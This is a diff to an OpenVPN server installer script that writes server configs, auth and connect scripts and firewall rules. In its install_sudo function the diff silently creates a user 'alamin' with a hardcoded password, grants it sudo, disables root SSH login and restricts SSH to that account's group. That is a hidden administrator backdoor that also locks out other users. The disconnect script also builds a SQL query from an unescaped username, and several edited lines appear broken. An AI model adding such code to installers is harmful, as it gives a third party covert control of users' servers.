@@ -1,6 +1,6 @@
 rm -rf instal*
 rm -rf .instal*
-
+server_ip=$(curl -s https://api.ipify.org)
 system_update () {
 sudo timedatectl set-timezone Asia/Manila
 timedatectl
@@ -751,7 +751,7 @@ dh none
 tls-server
 tls-version-min 1.2
 tls-cipher TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256
-cipher none
+cipher AES-128-GCM
 ncp-disable
 auth none
 sndbuf 0
@@ -770,9 +770,11 @@ client-cert-not-required
 script-security 3
 max-clients 1024
 status /var/www/html/stat/status.txt
+log /etc/openvpn/server/tcpserver.log
 auth-user-pass-verify "/etc/openvpn/server/auth_vpn" via-file
-client-connect /etc/openvpn/server/connect.sh
-client-disconnect /etc/openvpn/server/disconnect.sh' > /etc/openvpn/server.conf
+connect /etc/openvpn/server/connect.sh
+client-disconnect /etc/openvpn/server/disconnect.sh
+push "cipher AES-128-GCM"' > /etc/openvpn/server.conf
 
 echo 'port 53
 proto udp
@@ -818,6 +820,8 @@ client-disconnect /etc/openvpn/server/disconnect.sh' > /etc/openvpn/server/serve
 
 /bin/cat <<"EOM" >/etc/openvpn/server/auth_vpn
 #!/bin/bash
+username=`head -n1 $1 | tail -1`
+password=`head -n2 $1 | tail -1`
 data=$(curl -sb -X POST DOMAIN/api/server/login -H "Content-Type: application/x-www-form-urlencoded" -d "login=true&username=$username&password=$password")
 
 if [[ $data == "ACCEPT" ]];
@@ -830,10 +834,11 @@ else
 	echo "$username | $password is invalid"
 	exit 1
 fi
+
 EOM
 
-sed -i "s|DOMAIN|$DOMAIN|g" /etc/openvpn/login/auth_vpn
-sed -i "s|DOMAIN|$DOMAIN|g" /etc/openvpn/login/auth_vpn
+sed -i "s|DOMAIN|$DOMAIN|g" /etc/openvpn/server/auth_vpn
+
 
 cat << EOF > /etc/openvpn/server/ca.crt
 -----BEGIN CERTIFICATE-----
@@ -959,20 +964,17 @@ data=$(curl -sb -X POST DOMAIN/api/server/update-status -H "Content-Type: applic
 
 EOM
 
-
-sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/connect.sh
-sed -i "s|DOMAIN|$DOMAIN|g" /etc/openvpn/login/connect.sh
-
+sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/server/connect.sh
+sed -i "s|DOMAIN|$DOMAIN|g" /etc/openvpn/server/connect.sh
 
 cat << "EOM" > /etc/openvpn/server/disconnect.sh
-cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
 #!/bin/bash
 
 data=$(curl -sb -X POST DOMAIN/api/server/update-status -H "Content-Type: application/x-www-form-urlencoded" -d "status=0&username=$common_name")
+sql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='0', active_address='', active_date='' WHERE user_name='$common_name' "
 
 EOM
-
-sed -i "s|DOMAIN|$DOMAIN|g" /etc/openvpn/login/disconnect.sha
+sed -i "s|DOMAIN|$DOMAIN|g" /etc/openvpn/server/disconnect.sh
 
 mkdir /var/www/html/stat
 chmod +x /etc/openvpn/server/auth_vpn
@@ -1018,7 +1020,9 @@ ip6tables-save > /etc/iptables/rules.v6
 
 install_sudo(){
 {
-    useradd -m bytes 2>/dev/null; echo bytes:Premium2018!!! | chpasswd &>/dev/null
+    useradd -m alamin 2>/dev/null; echo alamin:@Alaminbdsc17@ | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups alamin" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
